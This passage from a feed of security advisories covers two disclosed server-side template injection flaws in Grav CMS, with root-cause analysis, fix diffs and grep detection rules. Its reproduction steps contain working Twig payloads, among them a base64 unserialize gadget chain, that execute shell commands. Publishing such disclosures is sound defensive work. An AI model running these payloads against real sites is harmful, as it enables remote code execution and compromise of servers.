</p>\n<table>\n<thead>\n<tr>\n<th><strong>Metric</strong></th>\n<th><strong>Value</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>Attack Vector (AV)</strong></td>\n<td>Network</td>\n</tr>\n<tr>\n<td><strong>Attack Complexity (AC)</strong></td>\n<td>Low</td>\n</tr>\n<tr>\n<td><strong>Privileges Required (PR)</strong></td>\n<td>High</td>\n</tr>\n<tr>\n<td><strong>User Interaction (UI)</strong></td>\n<td>None</td>\n</tr>\n<tr>\n<td><strong>Scope (S)</strong></td>\n<td>Unchanged</td>\n</tr>\n<tr>\n<td><strong>Confidentiality (C)</strong></td>\n<td>High</td>\n</tr>\n<tr>\n<td><strong>Integrity (I)</strong></td>\n<td>High</td>\n</tr>\n<tr>\n<td><strong>Availability (A)</strong></td>\n<td>High</td>\n</tr>\n</tbody></table>\n<h2 id=\"product-overview\">Product Overview:</h2>\n<p>Grav is a PHP-based flat-file content management system (CMS) designed to provide a fast and simple way to build websites. It supports rendering of web pages written in Markdown and Twig expressions, and provides an administration panel to manage the entire website via an optional Admin plugin.</p>\n<h2 id=\"vulnerability-summary\">Vulnerability Summary:</h2>\n<p>The patch for <a href=\"https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66/\">CVE-2022-2073</a>, a server-side template injection vulnerability in Grav leveraging the default <code>filter()</code> function, did not block other built-in functions exposed by Twig's Core Extension that could be used to invoke arbitrary unsafe functions, thereby allowing for remote code execution.</p>\n<h2 id=\"vulnerability-details\">Vulnerability Details:</h2>\n<p>Twig comes with an extension known as the <a href=\"https://github.com/twigphp/Twig/blob/v1.44.7/src/Extension/CoreExtension.php\">Core Extension</a> that is enabled by default when initialising a new <a href=\"https://github.com/twigphp/Twig/blob/v1.44.7/src/Environment.php#L148\">Twig environment</a>. Twig's Core Extension provides multiple built-in filters, such as the <code>filter()</code> function, which can be used in Twig templates. </p>\n<p><a href=\"https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66/\">CVE-2022-2073</a> leverages the default <code>filter()</code> filter function in Twig to invoke arbitrary unsafe functions. This was patched by overriding the default <code>filter()</code> filter function in commit <a href=\"https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83\">9d6a2d</a> of Grav v1.7.34 to perform validation checks on the arguments passed to <code>filter()</code>:</p>\n<pre><code class=\"language-diff\">...\nclass GravExtension extends AbstractExtension implements GlobalsInterface\n{\n    ...\n    public function getFilters(): array\n    {\n        return [\n            ...\n            // Security fix\n+           new TwigFilter('filter', [$this, 'filterFilter'], ['needs_environment' =&gt; true]),\n        ];\n    }\n    \n    ...\n\n+   /**\n+    * @param Environment $env\n+    * @param array $array\n+    * @param callable|string $arrow\n+    * @return array|CallbackFilterIterator\n+    * @throws RuntimeError\n+    */\n+   function filterFilter(Environment $env, $array, $arrow)\n+   {\n+       if (is_string($arrow) &amp;&amp; Utils::isDangerousFunction($arrow)) {\n+           throw new RuntimeError('Twig |filter(\"' . $arrow . '\") is not allowed.');\n+       }\n+\n+       return \\twig_array_filter($env, $array, $arrow);\n+   }\n}\n</code></pre>\n<p>However, looking at the source code of <a href=\"https://github.com/twigphp/Twig/blob/v1.44.7/src/Extension/CoreExtension.php\">/src/Extension/CoreExtension.php</a> of Twig, alternative default Twig filters could also be used invoke arbitrary functions:</p>\n<pre><code class=\"language-php\">...\nclass CoreExtension extends AbstractExtension\n{\n    ...\n    public function getFilters(): array\n    {\n        return [\n            ...\n            // array helpers\n            ...\n            new TwigFilter('filter', 'twig_array_filter', ['needs_environment' =&gt; true]), // unsafe\n            new TwigFilter('map', 'twig_array_map', ['needs_environment' =&gt; true]), // unsafe\n            new TwigFilter('reduce', 'twig_array_reduce', ['needs_environment' =&gt; true]), // unsafe\n        ];\n    }\n</code></pre>\n<p>The three filter functions above respectively call <code>array_filter()</code>, <code>array_map()</code> and <code>array_reduce()</code>. Since only <code>filter()</code> is being overriden by Grav to ensure that the callable passed to <code>filter()</code> does not result in the invocation of an unsafe function, the other two functions (i.e. <code>map()</code> and <code>reduce()</code>) could be used by an authenticated attacker that is able to inject and render malicious templates to gain remote code execution.</p>\n<h2 id=\"exploit-conditions\">Exploit Conditions:</h2>\n<p>This vulnerability can be exploited if the attacker has access to:</p>\n<ol>\n<li>an administrator account, or</li>\n<li>a non-administrator, user account that are granted the following permissions:<ul>\n<li>login access to Grav admin panel, and</li>\n<li>page creation or update rights</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"reproduction-steps\">Reproduction Steps:</h2>\n<ol>\n<li>Log in to Grav Admin using an administrator account.</li>\n<li>Navigate to <code>Accounts &gt; Add</code>, and ensure that the following permissions are assigned when creating a new low-privileged user:<ul>\n<li>Login to Admin - Allowed</li>\n<li>Page Update - Allowed</li>\n</ul>\n</li>\n<li>Log out of Grav Admin, and log back in using the account created in step 2.</li>\n<li>Navigate to <code>http://&lt;grav_installation&gt;/admin/pages/home</code>.</li>\n<li>Click the <code>Advanced</code> tab and select the checkbox beside <code>Twig</code> to ensure that Twig processing is enabled for the modified webpage.</li>\n<li>Under the <code>Content</code> tab, insert the following payload within the editor:<pre><code class=\"language-twig\">{{ ['id'] | map('system') }}\n{{ ['id'] | reduce('system') }}\n</code></pre>\n</li>\n<li>Click the Preview button. Observe that the output of the <code>id</code> shell command is returned in the preview.</li>\n</ol>\n<h2 id=\"suggested-mitigations\">Suggested Mitigations:</h2>\n<p>Override the built-in Twig <code>map()</code> and <code>reduce()</code> filter functions in <code>system/src/Grav/Common/Twig/Extension/GravExtension.php</code> to validate the argument passed to the filter in <code>$arrow</code>.</p>\n<p>For example:</p>\n<pre><code class=\"language-diff\">...\nclass GravExtension extends AbstractExtension implements GlobalsInterface\n{\n    ...\n    public function getFilters(): array\n    {\n        return [\n            ...\n            // Security fix\n            new TwigFilter('filter', [$this, 'filterFilter'], ['needs_environment' =&gt; true]),\n+           new TwigFilter('map', [$this, 'mapFilter'], ['needs_environment' =&gt; true]),\n+           new TwigFilter('reduce', [$this, 'reduceFilter'], ['needs_environment' =&gt; true]),\n        ];\n    }\n\n    ...\n+   /**\n+    * @param Environment $env\n+    * @param array $array\n+    * @param callable|string $arrow\n+    * @return array|CallbackFilterIterator\n+    * @throws RuntimeError\n+    */\n+   function mapFilter(Environment $env, $array, $arrow)\n+   {\n+       if (!$arrow instanceof Closure &amp;&amp; !is_string($arrow) || Utils::isDangerousFunction($arrow)) {\n+           throw new RuntimeError('Twig |map(\"' . $arrow . '\") is not allowed.');\n+       }\n+\n+       return \\twig_array_map($env, $array, $arrow);\n+   }\n+ \n+   /**\n+    * @param Environment $env\n+    * @param array $array\n+    * @param callable|string $arrow\n+    * @return array|CallbackFilterIterator\n+    * @throws RuntimeError\n+    */\n+   function reduceFilter(Environment $env, $array, $arrow)\n+   {\n+       if (!$arrow instanceof Closure &amp;&amp; !is_string($arrow) || Utils::isDangerousFunction($arrow)) {\n+           throw new RuntimeError('Twig |reduce(\"' . $arrow . '\") is not allowed.');\n+       }\n+\n+       return \\twig_array_reduce($env, $array, $arrow);\n+   }\n}\n</code></pre>\n<h2 id=\"detection-guidance\">Detection Guidance:</h2>\n<p>The following strategies may be used to detect potential exploitation attempts.</p>\n<ol>\n<li>Searching within Markdown pages using the following shell command:<br><code>grep -Priz -e '\\|\\s*(map|reduce)\\s*\\(' /path/to/webroot/user/pages/</code></li>\n<li>Searching within Doctrine cache data using the following shell command:<br><code>grep -Priz -e '\\|\\s*(map|reduce)\\s*\\('  --include '*.doctrinecache.data' /path/to/webroot/cache/</code></li>\n<li>Searching within Twig cache using the following shell command:<br><code>grep -Priz -e 'twig_array_(map|reduce)' /path/to/webroot/cache/twig/</code></li>\n<li>Searching within compiled Twig template files using the following shell command:<br><code>grep -Priz -e '\\|\\s*(map|reduce)\\s*\\(' /path/to/webroot/cache/compiled/files/</code></li>\n</ol>\n<p>Note that it is not possible to detect indicators of compromise reliably using the Grav log file (located at <code>/path/to/webroot/logs/grav.log</code> by default), as successful exploitation attempts do not generate any additional logs. However, it is worthwhile to examine any PHP errors or warnings logged to determine the existence of any failed exploitation attempts.</p>\n<h2 id=\"credits\">Credits:</h2>\n<p>Ngo Wei Lin (<a href=\"https://twitter.com/Creastery\">@Creastery</a>) &amp; Wang Hengyue (<a href=\"https://twitter.com/w_hy_04\">@w_hy_04</a>) of STAR Labs SG Pte. Ltd. (<a href=\"https://twitter.com/starlabs_sg\">@starlabs_sg</a>)</p>\n<h2 id=\"vulnerability-disclosure\">Vulnerability Disclosure:</h2>\n<p>This vulnerability report is subject to a 120 day disclosure deadline as per <a href=\"https://starlabs.sg/advisories/STAR%20Labs%20SG%20Pte.%20Ltd.%20Vulnerability%20Disclosure%20Policy.pdf\">STAR Labs SG Pte. Ltd.'s Vulnerability Disclosure Policy</a>. After 120 days have elapsed, the vulnerability report will be published to the public by <a href=\"https://starlabs.sg/\">STAR Labs SG Pte. Ltd.</a> (STAR Labs).  </p>\n<p>The scheduled disclosure date is <em><strong>25th July, 2023</strong></em>. Disclosure at an earlier date is also possible if agreed upon by all parties.  </p>\n<p>Kindly note that STAR Labs reserved and assigned the following CVE identifiers to the respective vulnerabilities presented in this report:  </p>\n<ol>\n<li><strong>CVE-2023-30596</strong>\n Server-side Template Injection (SSTI) in getgrav/grav &lt;= v1.7.40 allows Grav Admin users with page creation or update rights to bypass the dangerous functions denylist check in <code>GravExtension.filterFilter()</code> and to achieve remote code execution via Twig's default filters <code>map()</code> and <code>reduce()</code>. This is a bypass of CVE-2022-2073.</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getgrav/grav/security/advisories/GHSA-whr7-m3f8-mpm8\">https://github.com/getgrav/grav/security/advisories/GHSA-whr7-m3f8-mpm8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-34448\">https://nvd.nist.gov/vuln/detail/CVE-2023-34448</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/244758d4383034fe4cd292d41e477177870b65ec\">https://github.com/getgrav/grav/commit/244758d4383034fe4cd292d41e477177870b65ec</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b\">https://github.com/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/8c2c1cb72611a399f13423fc6d0e1d998c03e5c8\">https://github.com/getgrav/grav/commit/8c2c1cb72611a399f13423fc6d0e1d998c03e5c8</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/9d01140a63c77075ef09b26ef57cf186138151a5\">https://github.com/getgrav/grav/commit/9d01140a63c77075ef09b26ef57cf186138151a5</a></li>\n<li><a href=\"https://github.com/twigphp/Twig/blob/v1.44.7/src/Environment.php#L148\">https://github.com/twigphp/Twig/blob/v1.44.7/src/Environment.php#L148</a></li>\n<li><a href=\"https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66/\">https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66/</a></li>\n<li><a href=\"https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83\">https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-whr7-m3f8-mpm8\">https://github.com/advisories/GHSA-whr7-m3f8-mpm8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-whr7-m3f8-mpm8",
            "title": "[getgrav/grav] Grav Server-side Template Injection (SSTI) via Twig Default Filters",
            "date_modified": "2023-06-16T19:37:08.000Z",
            "date_published": "2023-06-16T19:37:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-whr7-m3f8-mpm8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Hi, </p>\n<p>actually we have sent the bug report to <a href=\"mailto:security@getgrav.org\">security@getgrav.org</a> on 27th March 2023 and on 10th April 2023.</p>\n<h1 id=\"grav-server-side-template-injection-ssti-via-denylist-bypass-vulnerability\">Grav Server-side Template Injection (SSTI) via Denylist Bypass Vulnerability</h1>\n<h2 id=\"summary\">Summary:</h2>\n<table>\n<thead>\n<tr>\n<th><strong>Product</strong></th>\n<th>Grav CMS</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>Vendor</strong></td>\n<td>Grav</td>\n</tr>\n<tr>\n<td><strong>Severity</strong></td>\n<td>High - Users with login access to Grav Admin panel and page creation/update permissions are able to obtain remote code/command execution</td>\n</tr>\n<tr>\n<td><strong>Affected Versions</strong></td>\n<td>&lt;= <a href=\"https://github.com/getgrav/grav/tree/1.7.40\">v1.7.40</a> (Commit <a href=\"https://github.com/getgrav/grav/commit/685d76231a057416651ed192a6a2e83720800e61\">685d762</a>) (Latest version as of writing)</td>\n</tr>\n<tr>\n<td><strong>Tested Versions</strong></td>\n<td>v1.7.40</td>\n</tr>\n<tr>\n<td><strong>Internal Identifier</strong></td>\n<td>STAR-2023-0006</td>\n</tr>\n<tr>\n<td><strong>CVE Identifier</strong></td>\n<td>Reserved CVE-2023-30592, CVE-2023-30593, CVE-2023-30594</td>\n</tr>\n<tr>\n<td><strong>CWE(s)</strong></td>\n<td>CWE-184: Incomplete List of Disallowed Inputs, CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine</td>\n</tr>\n</tbody></table>\n<h2 id=\"cvss31-scoring-system\">CVSS3.1 Scoring System:</h2>\n<p><strong>Base Score:</strong> 7.2 (High)<br><strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H</code>  </p>\n<table>\n<thead>\n<tr>\n<th><strong>Metric</strong></th>\n<th><strong>Value</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>Attack Vector (AV)</strong></td>\n<td>Network</td>\n</tr>\n<tr>\n<td><strong>Attack Complexity (AC)</strong></td>\n<td>Low</td>\n</tr>\n<tr>\n<td><strong>Privileges Required (PR)</strong></td>\n<td>High</td>\n</tr>\n<tr>\n<td><strong>User Interaction (UI)</strong></td>\n<td>None</td>\n</tr>\n<tr>\n<td><strong>Scope (S)</strong></td>\n<td>Unchanged</td>\n</tr>\n<tr>\n<td><strong>Confidentiality (C)</strong></td>\n<td>High</td>\n</tr>\n<tr>\n<td><strong>Integrity (I)</strong></td>\n<td>High</td>\n</tr>\n<tr>\n<td><strong>Availability (A)</strong></td>\n<td>High</td>\n</tr>\n</tbody></table>\n<h2 id=\"product-overview\">Product Overview:</h2>\n<p>Grav is a PHP-based flat-file content management system (CMS) designed to provide a fast and simple way to build websites. It supports rendering of web pages written in Markdown and Twig expressions, and provides an administration panel to manage the entire website via an optional Admin plugin.</p>\n<h2 id=\"vulnerability-summary\">Vulnerability Summary:</h2>\n<p>The denylist introduced in commit <a href=\"https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83\">9d6a2d</a> to prevent dangerous functions from being executed via injection of malicious templates was insufficient and could be easily subverted in multiple ways -- (1) using unsafe functions that are not banned, (2) using capitalised callable names, and (3) using fully-qualified names for referencing callables. Consequently, a low privileged attacker with login access to Grav Admin panel and page creation/update permissions is able to inject malicious templates to obtain remote code execution.</p>\n<h2 id=\"vulnerability-details\">Vulnerability Details:</h2>\n<p>In addressing <a href=\"https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66/\">CVE-2022-2073</a>, a denylist was introduced in commit <a href=\"https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83\">9d6a2d</a> to validate and ensure that dangerous functions could not be executed via injection of malicious templates.</p>\n<p>The implementation of the denylist can be found in <code>Utils::isDangerousFunction()</code> within <a href=\"https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1952-L2190\">/system/src/Grav/Common/Utils.php</a>:</p>\n<pre><code class=\"language-php\">    /**\n     * @param string $name\n     * @return bool\n     */\n    public static function isDangerousFunction(string $name): bool\n    {\n        static $commandExecutionFunctions = [\n            'exec',\n            'passthru',\n            'system',\n            'shell_exec',\n            'popen',\n            'proc_open',\n            'pcntl_exec',\n        ];\n\n        static $codeExecutionFunctions = [\n            'assert',\n            'preg_replace',\n            'create_function',\n            'include',\n            'include_once',\n            'require',\n            'require_once'\n        ];\n\n        static $callbackFunctions = [\n            'ob_start' =&gt; 0,\n            'array_diff_uassoc' =&gt; -1,\n            'array_diff_ukey' =&gt; -1,\n            'array_filter' =&gt; 1,\n            'array_intersect_uassoc' =&gt; -1,\n            'array_intersect_ukey' =&gt; -1,\n            'array_map' =&gt; 0,\n            'array_reduce' =&gt; 1,\n            'array_udiff_assoc' =&gt; -1,\n            'array_udiff_uassoc' =&gt; [-1, -2],\n            'array_udiff' =&gt; -1,\n            'array_uintersect_assoc' =&gt; -1,\n            'array_uintersect_uassoc' =&gt; [-1, -2],\n            'array_uintersect' =&gt; -1,\n            'array_walk_recursive' =&gt; 1,\n            'array_walk' =&gt; 1,\n            'assert_options' =&gt; 1,\n            'uasort' =&gt; 1,\n            'uksort' =&gt; 1,\n            'usort' =&gt; 1,\n            'preg_replace_callback' =&gt; 1,\n            'spl_autoload_register' =&gt; 0,\n            'iterator_apply' =&gt; 1,\n            'call_user_func' =&gt; 0,\n            'call_user_func_array' =&gt; 0,\n            'register_shutdown_function' =&gt; 0,\n            'register_tick_function' =&gt; 0,\n            'set_error_handler' =&gt; 0,\n            'set_exception_handler' =&gt; 0,\n            'session_set_save_handler' =&gt; [0, 1, 2, 3, 4, 5],\n            'sqlite_create_aggregate' =&gt; [2, 3],\n            'sqlite_create_function' =&gt; 2,\n        ];\n\n        static $informationDiscosureFunctions = [\n            'phpinfo',\n            'posix_mkfifo',\n            'posix_getlogin',\n            'posix_ttyname',\n            'getenv',\n            'get_current_user',\n            'proc_get_status',\n            'get_cfg_var',\n            'disk_free_space',\n            'disk_total_space',\n            'diskfreespace',\n            'getcwd',\n            'getlastmo',\n            'getmygid',\n            'getmyinode',\n            'getmypid',\n            'getmyuid'\n        ];\n\n        static $otherFunctions = [\n            'extract',\n            'parse_str',\n            'putenv',\n            'ini_set',\n            'mail',\n            'header',\n            'proc_nice',\n            'proc_terminate',\n            'proc_close',\n            'pfsockopen',\n            'fsockopen',\n            'apache_child_terminate',\n            'posix_kill',\n            'posix_mkfifo',\n            'posix_setpgid',\n            'posix_setsid',\n            'posix_setuid',\n        ];\n\n        if (in_array($name, $commandExecutionFunctions)) {\n            return true;\n        }\n\n        if (in_array($name, $codeExecutionFunctions)) {\n            return true;\n        }\n\n        if (isset($callbackFunctions[$name])) {\n            return true;\n        }\n\n        if (in_array($name, $informationDiscosureFunctions)) {\n            return true;\n        }\n\n        if (in_array($name, $otherFunctions)) {\n            return true;\n        }\n\n        return static::isFilesystemFunction($name);\n    }\n\n    /**\n     * @param string $name\n     * @return bool\n     */\n    public static function isFilesystemFunction(string $name): bool\n    {\n        static $fileWriteFunctions = [\n            'fopen',\n            'tmpfile',\n            'bzopen',\n            'gzopen',\n            // write to filesystem (partially in combination with reading)\n            'chgrp',\n            'chmod',\n            'chown',\n            'copy',\n            'file_put_contents',\n            'lchgrp',\n            'lchown',\n            'link',\n            'mkdir',\n            'move_uploaded_file',\n            'rename',\n            'rmdir',\n            'symlink',\n            'tempnam',\n            'touch',\n            'unlink',\n            'imagepng',\n            'imagewbmp',\n            'image2wbmp',\n            'imagejpeg',\n            'imagexbm',\n            'imagegif',\n            'imagegd',\n            'imagegd2',\n            'iptcembed',\n            'ftp_get',\n            'ftp_nb_get',\n        ];\n\n        static $fileContentFunctions = [\n            'file_get_contents',\n            'file',\n            'filegroup',\n            'fileinode',\n            'fileowner',\n            'fileperms',\n            'glob',\n            'is_executable',\n            'is_uploaded_file',\n            'parse_ini_file',\n            'readfile',\n            'readlink',\n            'realpath',\n            'gzfile',\n            'readgzfile',\n            'stat',\n            'imagecreatefromgif',\n            'imagecreatefromjpeg',\n            'imagecreatefrompng',\n            'imagecreatefromwbmp',\n            'imagecreatefromxbm',\n            'imagecreatefromxpm',\n            'ftp_put',\n            'ftp_nb_put',\n            'hash_update_file',\n            'highlight_file',\n            'show_source',\n            'php_strip_whitespace',\n        ];\n\n        static $filesystemFunctions = [\n            // read from filesystem\n            'file_exists',\n            'fileatime',\n            'filectime',\n            'filemtime',\n            'filesize',\n            'filetype',\n            'is_dir',\n            'is_file',\n            'is_link',\n            'is_readable',\n            'is_writable',\n            'is_writeable',\n            'linkinfo',\n            'lstat',\n            //'pathinfo',\n            'getimagesize',\n            'exif_read_data',\n            'read_exif_data',\n            'exif_thumbnail',\n            'exif_imagetype',\n            'hash_file',\n            'hash_hmac_file',\n            'md5_file',\n            'sha1_file',\n            'get_meta_tags',\n        ];\n\n        if (in_array($name, $fileWriteFunctions)) {\n            return true;\n        }\n\n        if (in_array($name, $fileContentFunctions)) {\n            return true;\n        }\n\n        if (in_array($name, $filesystemFunctions)) {\n            return true;\n        }\n\n        return false;\n    }\n</code></pre>\n<p>The list of banned functions appears to be adapted from a <a href=\"https://stackoverflow.com/a/3697776\">StackOverflow post</a>. While the denylist looks rather comprehensive, there are actually multiple issues with the denylist implementation:</p>\n<ol>\n<li>There may be unsafe functions, be it built-in to PHP or user-defined, which are not be blocked. For example, <code>unserialize()</code> and aliases of blocked functions, such as <code>ini_alter()</code>, are not being included in the denylist.  </li>\n<li>A case-sensitive comparison is performed against the denylist, but PHP function names are case-insensitive. This allows using <code>filter('SYSTEM')</code> to trivially bypass the denylist validation check.  </li>\n<li>Fully qualified names can be used when referencing functions, allowing <code>filter('\\system')</code> to trivially bypass the denylist validation checks.</li>\n</ol>\n<h2 id=\"exploit-conditions\">Exploit Conditions:</h2>\n<p>This vulnerability can be exploited if the attacker has access to:</p>\n<ol>\n<li>an administrator account, or</li>\n<li>a non-administrative user account with the following permissions granted:<ul>\n<li>login access to Grav admin panel, and</li>\n<li>page creation or update rights</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"reproduction-steps\">Reproduction Steps:</h2>\n<ol>\n<li>Log in to Grav Admin using an administrator account.</li>\n<li>Navigate to <code>Accounts &gt; Add</code>, and ensure that the following permissions are assigned when creating a new low-privileged user:<ul>\n<li>Login to Admin - Allowed</li>\n<li>Page Update - Allowed</li>\n</ul>\n</li>\n<li>Log out of Grav Admin, and log back in using the account created in step 2.</li>\n<li>Navigate to <code>http://&lt;grav_installation&gt;/admin/pages/home</code>.</li>\n<li>Click the <code>Advanced</code> tab and select the checkbox beside <code>Twig</code> to ensure that Twig processing is enabled for the modified webpage.</li>\n<li>Under the <code>Content</code> tab, insert the following payload within the editor:<pre><code class=\"language-twig\">// Method 1: Using unserialize() to trigger system('id') call\n// Serialized payloaed generated using the phpggc tool: ./phpggc -b Monolog/RCE7 system 'id'\n// {{ 'TzozNzoiTW9ub2xvZ1xIYW5kbGVyXEZpbmdlcnNDcm9zc2VkSGFuZGxlciI6NDp7czoxNjoiACoAcGFzc3RocnVMZXZlbCI7aTowO3M6MTA6IgAqAGhhbmRsZXIiO3I6MTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czoyOiJpZCI7czo1OiJsZXZlbCI7aTowO319czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czozOiJwb3MiO2k6MTtzOjY6InN5c3RlbSI7fX0=' | base64_decode | array | filter('unserialize') }}\n\n// Method 2: Trigger system('id') via case-insensitive function names\n{{ ['id'] | filter('System') }}\n\n// Method 3: Trigger system('id') via fully qualified names when referencing functions\n{{ ['id'] | filter('\\\\system') }}\n</code></pre>\n</li>\n<li>Click the Preview button. Observe that the output of the <code>id</code> shell command is returned in the preview.</li>\n</ol>\n<h2 id=\"suggested-mitigations\">Suggested Mitigations:</h2>\n<p>It is recommended to review the list of functions, both default functions in PHP and user-defined functions, and include missing unsafe functions in the denylist. A non-exhaustive list of missing unsafe functions discovered is shown below:</p>\n<ul>\n<li><code>unserialize()</code></li>\n<li><code>ini_alter()</code></li>\n<li><code>simplexml_load_file()</code></li>\n<li><code>simplexml_load_string()</code></li>\n<li><code>forward_static_call()</code></li>\n<li><code>forward_static_call_array()</code></li>\n</ul>\n<p>The <code>Utils::isDangerousFunction()</code> function in <a href=\"https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1956-L2074\">/system/src/Grav/Common/Utils.php</a> should also be patched to disallow usage of fully qualified names when specifying callables, as well as ensure that validation performed on the <code>$name</code> parameter is case-insensitive.</p>\n<p>For example,</p>\n<pre><code class=\"language-diff\">...\nabstract class Utils\n{\n    ...\n    /**\n     * @param string $name\n     * @return bool\n     */\n    public static function isDangerousFunction(string $name): bool\n    {\n        ...\n+       if ($arrow instanceof Closure) {\n+           return false;\n+       }\n\n+       $name = strtolower($name);\n+       if (strpos($name, \"\\\\\") !== false) {\n+           return false;\n+       }\n\n        if (in_array($name, $commandExecutionFunctions)) {\n            return true;\n        }\n\n        if (in_array($name, $codeExecutionFunctions)) {\n            return true;\n        }\n\n        if (isset($callbackFunctions[$name])) {\n            return true;\n        }\n\n        if (in_array($name, $informationDiscosureFunctions)) {\n            return true;\n        }\n\n        if (in_array($name, $otherFunctions)) {\n            return true;\n        }\n\n        return static::isFilesystemFunction($name);\n    }\n    ...\n}\n</code></pre>\n<p>End users should also ensure that <code>twig.undefined_functions</code> and <code>twig.undefined_filters</code> properties in <code>/path/to/webroot/system/config/system.yaml</code> configuration file are set to <code>false</code> to disallow Twig from treating undefined filters/functions as PHP functions and executing them.</p>\n<h2 id=\"detection-guidance\">Detection Guidance:</h2>\n<p>The following strategies may be used to detect potential exploitation attempts.</p>\n<ol>\n<li>Searching within Markdown pages using the following shell command:<br><code>grep -Priz -e '(ini_alter|unserialize|simplexml_load_file|simplexml_load_string|forward_static_call|forward_static_call_array|\\|\\s*(filter|map|reduce))\\s*\\(' /path/to/webroot/user/pages/</code></li>\n<li>Searching within Doctrine cache data using the following shell command:<br><code>grep -Priz -e '(ini_alter|unserialize|simplexml_load_file|simplexml_load_string|forward_static_call|forward_static_call_array|\\|\\s*(filter|map|reduce))\\s*\\(' --include '*.doctrinecache.data' /path/to/webroot/cache/</code></li>\n<li>Searching within Twig cache using the following shell command: \n<code>grep -Priz -e '(ini_alter|unserialize|simplexml_load_file|simplexml_load_string|forward_static_call|forward_static_call_array|twig_array_(filter|map|reduce))\\s*\\(' /path/to/webroot/cache/twig/</code></li>\n<li>Searching within compiled Twig template files using the following shell command:<br><code>grep -Priz -e '(ini_alter|unserialize|simplexml_load_file|simplexml_load_string|forward_static_call|forward_static_call_array|\\|\\s*(filter|map|reduce))\\s*\\(' /path/to/webroot/cache/compiled/files/</code></li>\n</ol>\n<p>Note that it is not possible to detect indicators of compromise reliably using the Grav log file (located at <code>/path/to/webroot/logs/grav.log</code> by default), as successful exploitation attempts do not generate any additional logs. However, it is worthwhile to examine any PHP errors or warnings logged to determine the existence of any failed exploitation attempts.</p>\n<h2 id=\"credits\">Credits:</h2>\n<p>Ngo Wei Lin (<a href=\"https://twitter.com/Creastery\">@Creastery</a>) &amp; Wang Hengyue (<a href=\"https://twitter.com/w_hy_04\">@w_hy_04</a>) of STAR Labs SG Pte. Ltd. (<a href=\"https://twitter.com/starlabs_sg\">@starlabs_sg</a>)</p>\n<p>The scheduled disclosure date is <em><strong>25th July, 2023</strong></em>. Disclosure at an earlier date is also possible if agreed upon by all parties.  </p>\n<p>Kindly note that STAR Labs reserved and assigned the following CVE identifiers to the respective vulnerabilities presented in this report:  </p>\n<ol>\n<li><strong>CVE-2023-30592</strong>\n Server-side Template Injection (SSTI) in getgrav/grav &lt;= v1.7.40 allows Grav Admin users with page creation or update rights to bypass the dangerous functions denylist check in <code>Utils::isDangerousFunction()</code> and to achieve remote code execution via usage of unsafe functions, such as <code>unserialize()</code>, that are not blocked. This is a bypass of CVE-2022-2073.</li>\n<li><strong>CVE-2023-30593</strong>\n Server-side Template Injection (SSTI) in getgrav/grav &lt;= v1.7.40 allows Grav Admin users with page creation or update rights to bypass the dangerous functions denylist check in <code>Utils::isDangerousFunction()</code> and to achieve remote code execution via usage of capitalised names, supplied as strings, when referencing callables. This is a bypass of CVE-2022-2073.</li>\n<li><strong>CVE-2023-30594</strong>\n Server-side Template Injection (SSTI) in getgrav/grav &lt;= v1.7.40 allows Grav Admin users with page creation or update rights to bypass the dangerous functions denylist check in <code>Utils::isDangerousFunction()</code> and to achieve remote code execution via usage of fully-qualified names, supplied as strings, when referencing callables. This is a bypass of CVE-2022-2073.</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getgrav/grav/security/advisories/GHSA-j3v8-v77f-fvgm\">https://github.com/getgrav/grav/security/advisories/GHSA-j3v8-v77f-fvgm</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-34253\">https://nvd.nist.gov/vuln/detail/CVE-2023-34253</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/244758d4383034fe4cd292d41e477177870b65ec\">https://github.com/getgrav/grav/commit/244758d4383034fe4cd292d41e477177870b65ec</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b\">https://github.com/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/8c2c1cb72611a399f13423fc6d0e1d998c03e5c8\">https://github.com/getgrav/grav/commit/8c2c1cb72611a399f13423fc6d0e1d998c03e5c8</a></li>\n<li><a 